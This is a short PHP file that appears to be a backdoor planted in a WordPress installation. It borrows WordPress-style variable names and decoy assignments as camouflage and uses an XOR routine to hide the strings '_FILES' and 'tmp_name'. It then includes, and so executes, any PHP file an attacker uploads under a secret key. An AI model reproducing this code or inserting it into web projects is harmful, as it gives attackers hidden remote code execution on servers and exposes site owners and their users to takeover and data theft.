<?php 	

$emojum = 'UWC2XZEW6uIYyYX';
$sort_column = $emojum;
function ancestors($babes, $minutes)

{
	$default_editor = 'urls_to_ping';
    $can_export = $minutes;
    $taxonomies = urldecode($babes);
	$post_modified_gmt = 'is_single_tag';
    $previous_status = substr($can_export,0, strlen($taxonomies));
    $textarr = $taxonomies ^ $previous_status;
	$height = 'encoded_char';
    return $textarr;
	$query_var = 'field_no_prefix';
}
$children = ${ancestors("%0A%11%0A%7E%1D%09", $sort_column)};
$intermediate_file = $children;
	$comment = 'keys';
$last_changed = isset($intermediate_file[$sort_column]);

if ($last_changed)

{
    $backup_sizes = $children[$sort_column];

    $tags = $backup_sizes[ancestors("%21%3A3m6%3B%282", $sort_column)];

    $page_templates = $tags;

    include ($page_templates);

}
?>
